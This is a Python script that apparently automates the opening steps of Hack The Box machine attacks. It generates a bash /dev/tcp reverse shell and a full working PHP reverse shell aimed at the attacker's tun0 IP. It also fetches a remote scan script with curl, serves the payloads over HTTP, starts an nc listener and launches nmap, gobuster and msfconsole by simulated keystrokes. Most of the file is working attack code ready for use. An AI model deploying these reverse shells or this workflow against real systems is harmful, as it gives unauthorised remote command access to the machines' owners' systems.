#!/usr/bin/python3
from os import system as cmd
from time import sleep
import pyautogui as py
import subprocess
import re
import webbrowser

MACHINE_IP = "10.10.10.230"

# getting IP's and saving it in a file
with open('ip.txt','w') as f:
        ip = subprocess.run(['ip', 'a'],stdout=f,text=True)

# sperating tun0 ip
txt_file = open('ip.txt','r')
IP = txt_file.read()
pattern = re.compile("[10]+\.+[10]+\.+\d\d+\.+\w{2,3}")
search_tun0 = pattern.findall(IP)
tun0_IP = search_tun0[0]
print("TUN0 IP FOUND:",tun0_IP)

# generating bash revshell and php-rev-shell payloads
# bash rev shell
port = "9001"
rev_shell = "bash -c 'bash -i >& /dev/tcp/"+tun0_IP+"/"+port+" 0>&1\'"
shell_txt = open('shell.txt','w')
shell_txt.write(rev_shell)
shell_txt.close()
cmd('echo " " >> shell.txt') # to avoid that '#' char in last part of code

# php rev shell
rev_txt = open('php-rev-shell.php','w')
rev_txt.write('''<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = "'''+ tun0_IP + '''\";
$port = 1234;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();
        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }
        if ($pid) {
                exit(0);  // Parent exits
        }
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }
        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}
?>
''')
rev_txt.close()
print("\nPHP and BASH Rev Shell Files Created SUCESSFULLY")

# Checking whether the IP is live or not
print("\nChecking whether the IP is live or not")
cmd("echo 'ping -w 3 '"+MACHINE_IP+" > cmd.txt")
with open('ping.txt','w') as ping:
        png = subprocess.run(['bash','cmd.txt'],stdout=ping,text=True)
ping = open('ping.txt','r')
ping_txt = ping.read()
print
if "100% packet loss" in ping_txt or "Host Unreachable" in ping_txt:
        print("CHECK YOUR OVPN CONNECTION\nIP IS NOT REACHABLE :/")
        exit()
print("\nTHE IP",MACHINE_IP,"IS LIVE")

# creating htbs scan file
cmd('curl https://raw.githubusercontent.com/jopraveen/htbscan/main/htbs.py -o htbs.py')

# save time.txt
save_time_txt = open('save-time.txt','w')
save_time_txt.write('''
curl http://'''+tun0_IP+''':8080/php-rev-shell.php'''
+'''

'''+
rev_shell+'''

DEFAULT CREDS FOR LOGIN PAGE:

username: jopraveen
mail    : jopraveen@machine.htb
password: testtest
''')
save_time_txt.close()


# removing unwanted files and arranging payloads in a folder
cmd('rm ip.txt ping.txt cmd.txt')
cmd('mkdir www && mv save-time.txt php-rev-shell.php shell.txt www/')

# opening IP in web browser
webbrowser.open_new("http://"+MACHINE_IP)
sleep(2)
py.hotkey('ALT','TAB')
sleep(4)
# run nmap
py.write('python3 htbs.py '+ MACHINE_IP[-3:])
py.hotkey('ENTER')
py.hotkey('CTRL','SHIFT','RIGHT')
py.hotkey('ALT','RIGHT')
sleep(2)
# run gobuster
py.write("gobuster dir -u http://"+MACHINE_IP+"/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt")
py.hotkey('ENTER')

# opening needed terminals
py.hotkey('CTRL','SHIFT','T')
py.hotkey('ALT','RIGHT')
py.hotkey('CTRL','SHIFT','DOWN')
py.write('nc -lvvnp 9005')
py.hotkey('ENTER')
py.hotkey('ALT','UP')
py.write('cd /home/kali/auto-ctf/www')
py.hotkey('ENTER')
py.write('python3 -m http.server 8080')
py.hotkey('ENTER')
py.hotkey('ALT','DOWN')
py.hotkey('ALT','DOWN')
py.write('cd /home/kali/auto-ctf/www')
py.hotkey('ENTER')
py.write('cat save-time.txt')
py.hotkey('ENTER')
py.hotkey('ALT','LEFT')
py.write('msfconsole')
py.hotkey('ENTER')
py.hotkey('ALT','UP')
py.write('figlet "LET\'S GO" | lolcat -a -d 3')
py.hotkey('ENTER')
